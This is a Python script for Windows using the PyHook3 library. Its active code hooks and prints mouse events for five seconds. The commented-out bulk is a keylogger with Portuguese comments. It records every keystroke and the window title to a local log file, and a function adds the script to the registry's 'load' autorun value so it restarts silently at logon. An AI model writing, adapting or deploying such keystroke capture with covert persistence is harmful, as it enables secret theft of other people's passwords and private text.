import PyHook3
from PyHook3.HookManager import HookConstants
from PyHook3 import HookManager
import pygame
import time
import win32api
import win32con
import pythoncom
from threading import Timer


def OnMouseEvent(event):
  print('MessageName:',event.MessageName)
  print('Message:',event.Message)
  print('Time:',event.Time)
  print('Window:',event.Window)
  print('WindowName:',event.WindowName)
  print('Position:',event.Position)
  print('Wheel:',event.Wheel)
  print('Injected:',event.Injected)
  print('---')

  # return True to pass the event to other handlers
  # return False to stop the event from propagating
  return True

def OnKeyboardEvent(event):
  print('MessageName:',event.MessageName)
  print('Message:',event.Message)
  print('Time:',event.Time)
  print('Window:',event.Window)
  print('WindowName:',event.WindowName)
  print('Ascii:', event.Ascii, chr(event.Ascii))
  print('Key:', event.Key)
  print('KeyID:', event.KeyID)
  print('ScanCode:', event.ScanCode)
  print('Extended:', event.Extended)
  print('Injected:', event.Injected)
  print('Alt', event.Alt)
  print('Transition', event.Transition)
  print('---')

  # return True to pass the event to other handlers
  # return False to stop the event from propagating
  return True

# create the hook manangerk
# hm = PyHook3.HookManager()
# hm.KeyDown = OnKeyboardEvent
# hm.HookKeyboard()

hm = PyHook3.HookManager()
hm.MouseAll = OnMouseEvent
hm.HookMouse()
main_thread_id = win32api.GetCurrentThreadId()
# initialize pygame and start the game loop
def on_timer():
    win32api.PostThreadMessage(main_thread_id, win32con.WM_QUIT, 0, 0);

t = Timer(5.0, on_timer) # Quit after 5 seconds
t.start()



# def OnKeyboardEvent(event):
#     print ('MessageName:',event.MessageName)
#     print ('Ascii:', repr(event.Ascii), repr(chr(event.Ascii)))
#     print ('Key:', repr(event.Key))
#     print ('KeyID:', repr(event.KeyID))
#     print ('ScanCode:', repr(event.ScanCode))
#     print ('---')
#     return True
# hm = PyHook3.HookManager()
# hm.KeyDown = OnKeyboardEvent
# hm.HookKeyboard()

# # initialize pygame and start the game loop
# pygame.init()
# while True:c
# while True:
#     pygame.event.pump()


# import PyHook3 # Importando o pyHook
# import os, sys
# import winreg as winreg

# def dbCreateLog(key, wName):
# # Tratando as Teclas
#   if key == "Space":
#     key = "[ Espaço ]"
#   if key == "Tab":
#     key = "[TAB]"
#   if key == "Capital":
#     key = "[Caps Lock]"
#   if key == "Lshift":
#     key = "[sHIFT Esq]"
#   if key == "Lcontrol":
#     key = "[Control Esq]"
#   if key == "Lmenu":
#     key = "[Alt Esq]"
#   if key == "Rmenu":
#     key = "[Alt Dir]"
#   if key == "Rcontrol":
#     key = "[Control Dir]"
#   if key == "Rshift":
#     key = "[sHIFT Dir]"
#   if key == "Return":
#     key = "[ENTER]"
#   if key == "Back":
#     key = "[backspace]"
#   if key == "Oem_Comma":
#     key = "[VIRGULA]"
#   if key == "Oem_Period":
#     key = "[PONTO]"
#   if key == "2":
#     key = "['@' OU 2]"
#   if key == "Left":
#     key = "[Esquerda]"
#   if key == " Right":
#     key = "[Direita]"
#   if key == "Up":
#     key = "[Para Cima]"
#   if key == "Down":
#     key = "[Para Baixo]"
#   if key == "Oem_Minus":
#     key = " _ "
#   if key == "Numpad0":
#     key = "0"
#   if key == "Numpad1":
#     key = "1"
#   if key == "Numpad2":
#     key = "2"
#   if key == "Numpad3":
#     key = "3"
#   if key == "Numpad4":
#     key = "4"
#   if key == "Numpad5":
#     key = "5"
#   if key == "Numpad6":
#     key = "6"
#   if key == "Numpad7":
#     key = "7"
#   if key == "Numpad8":
#     key = "8"
#   if key == "Numpad9":
#     key = "9"
#   if key == "Numpad0":
#     key = "0"

# # Arquivo de log
#   file = "KeyLogg2.txt" # ".html"
#   f = open(file, "a")
#   nomeJanela = str(wName)
#   f.write(nomeJanela + "--")
#   if wName != nomeJanela:
#     f.write(wName + "--")
#   i = 0
#   for i in range(i+1):
#     f.write(key)
# 	# Salvando as teclas
#   f.close

# def OnKeyboardEvent(event):
# # """Cria a função para catalogar a tecla"""
#   WindowName = event.WindowName # Janelas
#   key = event.Key # Teclas	
#   print("[%s] - %s" %(WindowName, key))
#   dbCreateLog(key, WindowName)
#   #return key # retorna a tecla
#   return True

# hm = PyHook3.HookManager() # Cria a instancia
# hm.KeyDown = OnKeyboardEvent # Registra a o evento (callbacks)
# hm.HookKeyboard() # Inicia o Hook (varredura das teclas digitadas)

# def autoRunReg():
#   try:
#     fileName = str("%s") %(sys.argv[0])
#     dirFile = """%s+\%s""" %(os.getcwd() ,fileName)

#     value = (dirFile)
#     print(value)

#     key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,"Software\Microsoft\Windows NT\CurrentVersion\Windows")
#     winreg.SetValueEx(key, "load", None, winreg.REG_SZ, value)
#   except: 
#     pass

# if __name__ == '__main__':
#   try:
#     autoRunReg()
#   except: pass	
#   import pythoncom
#   pythoncom.PumpMessages()
